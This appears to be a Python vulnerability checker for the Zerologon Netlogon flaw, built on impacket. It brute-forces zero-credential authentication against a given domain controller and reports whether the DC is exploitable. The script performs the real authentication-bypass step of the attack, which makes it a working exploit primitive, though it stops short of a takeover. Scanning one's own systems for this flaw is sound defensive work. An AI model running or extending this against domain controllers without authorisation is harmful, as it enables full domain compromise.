from argparse import ArgumentParser
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5 import transport
import os

import sys

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000  # False negative chance: 0.04%


def fail(msg):
    print(msg, file=sys.stderr)
    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
    sys.exit(2)


def try_zero_authenticate(dc_handle, dc_ip, target_computer,user,password,test_type):
    # Connect to the DC's Netlogon service.
    if 'rpc' in test_type:
        binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    else:
        binding = r'ncacn_np:%s[\PIPE\netlogon]' % dc_ip

    rpctransport = transport.DCERPCTransportFactory(binding)

    if hasattr(rpctransport, 'set_credentials'):
        username = user
        if not username:
            username = target_computer
        # This method exists only for selected protocol sequences.
        rpctransport.set_credentials(user, password, "zero.networks", '', '')

    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(nrpc.MSRPC_UUID_NRPC)

    # Use an all-zero challenge and credential.

    finaly_rand_byte = os.urandom(1)

    plaintext = b'\x00' * 7 + finaly_rand_byte
    ciphertext = b'\x00' * 7 + finaly_rand_byte

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(dce, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            dce, dc_handle + '\x00', target_computer + '$\x00',
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                     target_computer + '\x00', ciphertext, flags
        )

        # It worked!
        assert server_auth['ErrorCode'] == 0
        return dce

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer,user,password,test_type):
    # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
    print('Performing authentication attempts...')
    rpc_con = None
    for attempt in range(0, MAX_ATTEMPTS):
        rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer,user,password,test_type)

        if rpc_con == None:
            print('=', end='', flush=True)
        else:
            break

    if rpc_con:
        print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
    else:
        print('\nAttack failed. Target is probably patched.')
        sys.exit(1)

def parse_args():
    parser = ArgumentParser(prog=ArgumentParser().prog,prefix_chars="-/",add_help=False,description=f'Perform zerologon test over RPC/TCP or RPC/SMB')

    parser.add_argument('-h','--help','/?','/h','/help',action='help',help='show this help message and exit')
    parser.add_argument("dc_name", help="NetBIOS name of the domain controller", type=str)
    parser.add_argument("dc_ip", help="ip address of the domain controller", type=str)
    parser.add_argument("-u", "--user", dest='user', metavar='', help="authenticated domain user,may be required for SMB", type=str,default="")
    parser.add_argument("-p", "--pass", dest='password', metavar='', help="authenticated domain user's password, may be required for SMB", type=str,default="")
    parser.add_argument('-t', '--type', metavar='', dest='test_type', choices=['smb','rpc'], default='smb',
                        help='rpc or smb scan. choices: [%(choices)s], (default: \'smb\').')

    args = parser.parse_args()

    return args


if __name__ == '__main__':
    args = parse_args()

    dc_name = args.dc_name
    dc_ip = args.dc_ip
    user = args.user
    password = args.password
    test_type = args.test_type


    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name,user,password,test_type)
